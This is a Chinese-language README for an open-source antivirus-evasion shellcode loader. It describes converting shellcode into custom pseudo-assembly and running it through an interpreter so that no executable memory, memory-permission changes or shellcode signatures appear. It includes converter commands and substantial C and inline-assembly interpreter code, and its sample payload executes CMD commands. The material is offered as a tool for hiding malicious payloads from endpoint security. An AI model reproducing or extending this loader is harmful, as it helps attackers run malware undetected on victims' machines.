# No_X_Memory_ShellCode_Loader

### 请给我 Star 🌟，非常感谢！这对我很重要！

### Please give me Star 🌟, thank you very much! It is very important to me!

### 1. 介绍

这是一个免杀项目，与 PWN 无关！

无需解密，无需 X 内存，直接加载运行 R 内存中的 ShellCode 密文。

x64 项目: https://github.com/HackerCalico/No_X_Memory_ShellCode_Loader

规避了以下特征：

(1) 申请 RWX 属性的内存。

(2) 来回修改 W 和 X 的内存属性。

(3) 内存中出现 ShellCode 特征码。

[![1.png](https://raw.githubusercontent.com/HackerCalico/No_X_Memory_ShellCode_Loader/main/run.png)](https://github.com/HackerCalico/No_X_BOF/blob/No_X_Memory_ShellCode_Loader/run.png)

### 2. 技术原理

**加载流程：**

(1) 正常生成 ShellCode 机器码。

(2) ShellCode --- 转换器 ---> 自定义汇编指令。

(3) 解释器 运行 自定义汇编指令。

**详细介绍：**

https://hackercalico.github.io/2024/08/13/%E6%97%A0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E5%8A%A0%E8%BD%BD%20ShellCode%20%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/

### 3. 项目文件

<u>ShellCode</u>：多种 ShellCode 源码。

<u>Converter</u>：自定义汇编指令转换器。

```bash
pip install capstone
```

<u>Loader</u>：ShellCode 加载器 (自定义汇编指令解释器)。

<u>GenerateAsmInstruction</u>：用于生成 Loader\AsmInstruction.asm 函数汇编指令。

### 4. 转换器使用与实现

为了减轻解释器的压力，我们的自定义汇编指令一定要设计成容易解释的格式。

<mark>下面对本项目提供的 CMD 命令执行 ShellCode 案例进行讲解：</mark>

**(1) 生成原始汇编指令**

将 ShellCode 机器码 (ShellCode.txt) 转为原始汇编指令 (asm.txt)。

该功能简单利用 capstone 库实现。

```bash
> python Converter.py
1.反汇编
2.Imul转换
3.生成自定义汇编指令
选择: 1
ShellCode使用的汇编指令: {'lea', 'cdqe', ......, 'repStosb'}
汇编指令生成完毕: asm.txt
```

asm.txt：

```c
0x0_mov_qword ptr [rsp + 0x20], r9
0x5_mov_qword ptr [rsp + 0x18], r8
0xa_mov_dword ptr [rsp + 0x10], edx
......
```

**(2) 修改 asm.txt**

考虑到原始汇编指令可能存在一些特殊情况，需要进行修改。所以我将转换过程分为了先转为原始汇编指令，再转为自定义汇编指令两个阶段。

观察原始汇编指令，可以发现存在 imul 指令，并且全部为 imul a, a, b 的格式。我们直接把它们全部转为 imul a, b 的格式方便处理。

```bash
> python Converter.py
1.反汇编
2.Imul转换
3.生成自定义汇编指令
选择: 2
已将 asm.txt 中的 imul a, a, b 全部转换为 imul a, b
```

**(3) 生成自定义汇编指令**

将 asm.txt 中的原始汇编指令转为自定义汇编指令。

```bash
> python Converter.py
1.反汇编
2.Imul转换
3.生成自定义汇编指令
选择: 3
0_4_q_pq70+i20_q_q38_......2ed_3_q__q__!

PVOID mnemonicMap[] = { Push, Pop, ......, Jle };
```

0_4_q_pq70+i20_q_q38 为第一条自定义汇编指令，! 为整个自定义汇编指令的结束标志。

第一条的原始汇编指令：0x00 mov qword ptr [rsp + 0x20], r9

<u>指令地址</u>：0x00 ------> 0

在处理 Jcc 跳转指令时需要使用，去掉 0x 减短长度。

<u>助记符</u>：mov ------> 4

4 为 mov 在 mnemonicMap 中的下标。

解释器逐条指令执行，通过下标获取 mnemonicMap 中当前指令的处理函数指针，进行反射调用。避免了解释器代码中出现大量 if else 或 switch case。

<u>操作数1</u>：qword ptr [rsp + 0x20] ------> q_pq70+i20

q 表示 QWORD，p 表示 ptr。

q70 表示 vtRSP。在解释器中通过 vtRegs 数组存储虚拟寄存器的值，70 是 vtRSP 相对 vtRegs 基址的偏移，直接通过地址操作寄存器的值。避免了解释器代码中出现大量不同位数的寄存器的定义，以及繁琐操作。

i20 表示立即数 0x20。

<u>操作数2</u>：r9 ------> q_q38

q 表示 QWORD。

q38 表示 R9，同理偏移。

### 5. 解释器实现

**(1) 创建虚拟栈和虚拟寄存器**

```c
PVOID vtStack = malloc(0x10000);

DWORD_PTR vtRegs[18] = { 0 };
vtRegs[14] = vtRegs[15] = (DWORD_PTR)vtStack + 0x9000;
```

14 和 15 分别对应 vtRSP 和 vtRBP。

**(2) 设置虚拟寄存器的初值**

因为解释器是从 ShellCode 函数的开头进行模拟的，所以在模拟开始之前，要先在虚拟空间中构建出 ShellCode 函数的参数。

本项目提供的 CMD 命令执行 ShellCode 函数通过以下代码调用：

```c
ExecuteCmd(commandPara, commandParaLength, &outputData, &outputDataLength, funcAddr);
```

该行代码对应的汇编指令：

```c
lea rax, [funcAddr]
mov qword ptr [rsp+20h], rax
lea r9, [outputDataLength]
lea r8, [outputData]
mov edx, dword ptr [commandParaLength]
lea rcx, [commandPara]
call ExecuteCmd
```

所以要通过以下代码在虚拟空间中构建出函数参数：

```c
vtRegs[0] = (DWORD_PTR)pFuncAddr;
*(PDWORD_PTR)(vtRegs[14] + 0x20) = vtRegs[0];
vtRegs[7] = (DWORD_PTR)pOutputDataLength;
vtRegs[6] = (DWORD_PTR)pOutputData;
vtRegs[3] = commandParaLength;
vtRegs[2] = (DWORD_PTR)commandPara;
vtRegs[14] = vtRegs[14] - sizeof(DWORD_PTR);
```

**(3) 解析自定义汇编指令**

根据 <mark>指令地址_助记符_位数1_操作数1_位数2_操作数2</mark> 的格式将每条指令的元素解析出来。

通过 GetOpTypeAndAddr 函数获取每个操作数的类型和地址，每种指令的处理函数会直接通过操作数的地址对其值进行操作，非常方便。

<u>如果操作数是立即数</u>，例如 i12 (0x12)。则直接通过 strtol 函数将 12 字符串转为数字，该数字的地址即为该操作数的地址。

<u>如果操作数是 lea 的第二个操作数或内存空间</u>，例如 lq70+i20 ([rsp + 0x20]) 或 pq70+i20 (ptr [rsp + 0x20])。则先解析其子元素进行计算，计算结果保存到 number1。如果操作数是 lea 的第二个操作数，则 number1 的地址即为该操作数的地址。如果操作数是内存空间，则 number1 的值即为该操作数的地址。

<u>如果操作数是寄存器</u>，例如 q70 (rsp)。70 是 vtRSP 相对 vtRegs 基址的偏移，则 vtRegs 基址 + 70 即为该操作数的地址。

```c
// 获取操作数值的 类型(r寄存器/m内存空间) + 地址
DWORD_PTR GetOpTypeAndAddr(char* op, char* pOpType1, PDWORD_PTR pVtRegs, PDWORD_PTR opNumber) {
    ......
    // 立即数
    if (op[0] == 'i') {
        *opNumber = strtol(op + 1, &endPtr, 16);
        return (DWORD_PTR)opNumber;
    }
    // lea [] / ptr []
    else if (op[0] == 'l' || op[0] == 'p') {
        ......
        // 解析算式 (未考虑“*”)
        ParseFormula(op + 1, formula, symbols);
        // 计算 (未考虑“*”)
        DWORD_PTR number1 = 0;
        ......
        // lea []
        if (op[0] == 'l') {
            *opNumber = number1;
            return (DWORD_PTR)opNumber;
        }
        // ptr []
        if (pOpType1 != NULL) {
            *pOpType1 = 'm';
        }
        return number1;
    }
    // 寄存器
    else {
        if (pOpType1 != NULL) {
            *pOpType1 = 'r';
        }
        return (DWORD_PTR)pVtRegs + strtol(op + 1, &endPtr, 16);
    }
}
```

**(4) 调用对应指令的处理函数**

通过解析得到的当前指令的下标获取当前指令的处理函数指针。

```c
PVOID mnemonicMap[] = { Push, Pop, ......, AsmJle };
PVOID instructionFunc = mnemonicMap[mnemonicIndex];
```

<mark>下面举几种指令的处理函数的例子：</mark>

<u>Mov 指令</u>

```c
// 其他两个操作数的指令
else {
    ((void(*)(...))instructionFunc)(opType1, opBit1, opAddr1, opBit2, opAddr2);
}
```

```c
void Mov(char opType1, char opBit1, DWORD_PTR opAddr1, char opBit2, DWORD_PTR opAddr2) {
    switch (opBit1)
    {
    case 'q':
        *(PDWORD64)opAddr1 = *(PDWORD64)opAddr2;
        break;
    case 'd':
        if (opType1 == 'r') {
            *(PDWORD_PTR)opAddr1 = *(PDWORD)opAddr2;
        }
        else {
            *(PDWORD)opAddr1 = *(PDWORD)opAddr2;
        }
        break;
    case 'w':
        *(PWORD)opAddr1 = *(PWORD)opAddr2;
        break;
    case 'b':
        *(PBYTE)opAddr1 = *(PBYTE)opAddr2;
        break;
    }
}
```

case 'd' 表示 操作数1 为 DWORD，在 操作数1 类型为 DWORD 寄存器时存在特殊情况。

特殊情况通过下例来解释：

```c
mov rax, 0x1234567812345678
mov eax, 0x11111111
```

运行后 rax 为 0x0000000011111111。

<u>Cmp 指令</u>

```c
else if (instructionFunc == AsmCmp || instructionFunc == AsmTest) {
     ((void(*)(...))instructionFunc)(opBit1, opAddr1, opAddr2, pVtRegs);
}
```

将两个操作数的值赋值到 r10 和 r11，计算完成后将标志寄存器的值赋值到 vtEFL。

```c
void AsmCmp(char opBit1, DWORD_PTR opAddr1, DWORD_PTR opAddr2, PDWORD_PTR pVtRegs) {
    __asm {
        mov r8, qword ptr[opAddr1]
        mov r9, qword ptr[opAddr2]
        mov r10, qword ptr[r8]
        mov r11, qword ptr[r9]
    }
    DWORD_PTR vtEFL;
    switch (opBit1)
    {
    case 'q':
        __asm {
            cmp r10, r11
            pushf
            pop rax
            mov vtEFL, rax
        }
        break;
    ......
    }
    pVtRegs[17] = vtEFL;
}
```

<u>Jcc 指令</u>

传入具体的 Jcc 指令的处理函数指针。

```c
Jcc(instructionFunc, opAddr1, pVtRegs);
```

通过具体的 Jcc 指令的处理函数判断是否跳转。如果跳转，则将 操作数1 的值赋值给 vtRIP。

```c
void Jcc(PVOID instructionFunc, DWORD_PTR opAddr1, PDWORD_PTR pVtRegs) {
    DWORD_PTR vtEFL = pVtRegs[17];
    int isJmp = ((int(*)(...))instructionFunc)(vtEFL);
    if (isJmp) {
        DWORD_PTR vtRIP = *(PDWORD_PTR)opAddr1;
        pVtRegs[16] = vtRIP;
    }
}
```

<u>Je 指令</u>

作为具体的 Jcc 指令的处理函数，先将 vtEFL 的值赋值到标志寄存器，再判断是否跳转。

```c
int AsmJe(DWORD_PTR vtEFL) {
    int isJmp = 1;
    __asm {
        mov rax, vtEFL
        push rax
        popf
        je jmp
        mov isJmp, 0x00
        jmp :
    }
    return isJmp;
}
```

<u>Call 指令</u>

其实现是所有指令中最复杂的，因为涉及到 Windows API 的调用。

首先保存真实栈顶栈底，最后还原真实栈顶栈底，保证解释器能正常运行。

调用 Windows API 之前，要先将虚拟寄存器的值覆盖真实寄存器的值，相当于构造好 Windows API 的参数。

调用完 Windows API 之后，要将真实寄存器的值覆盖虚拟寄存器的值。

```c
void AsmCall(DWORD_PTR opAddr1, PDWORD_PTR pVtRegs) {
    // 保存真实栈顶栈底
    DWORD_PTR realRSP;
    DWORD_PTR realRBP;
    __asm {
        mov realRSP, rsp
        mov realRBP, rbp
    }

    // Window API 地址
    DWORD_PTR winApiAddr = *(PDWORD_PTR)opAddr1;

    // 虚拟寄存器 覆盖 真实寄存器
    DWORD_PTR vtRAX = pVtRegs[0];
    ......
    DWORD_PTR vtRBP = pVtRegs[15];
    __asm {
        mov rax, vtRAX
        ......
        mov rsp, vtRSP
        // mov rbp, vtRBP (与 Call 冲突)
    }

    // 调用 Windows API
    __asm {
        call qword ptr[winApiAddr] // (call qword ptr [rbp])
    }

    // 保存调用 Windows API 后真实寄存器的值
    __asm {
        push rax
        ......
        push rbp
    }

    // 真实寄存器 覆盖 虚拟寄存器
    DWORD_PTR currentRSP;
    __asm {
        mov currentRSP, rsp;
    }
    pVtRegs[0] = *(PDWORD_PTR)(currentRSP + 0x78); // RAX
    ......
    pVtRegs[14] = *(PDWORD_PTR)(currentRSP + 0x08) + 0x70; // RSP
    pVtRegs[15] = *(PDWORD_PTR)(currentRSP + 0x00); // RBP

    // 还原真实栈顶栈底
    __asm {
        mov rsp, realRSP
        mov rbp, realRBP
    }
}
```
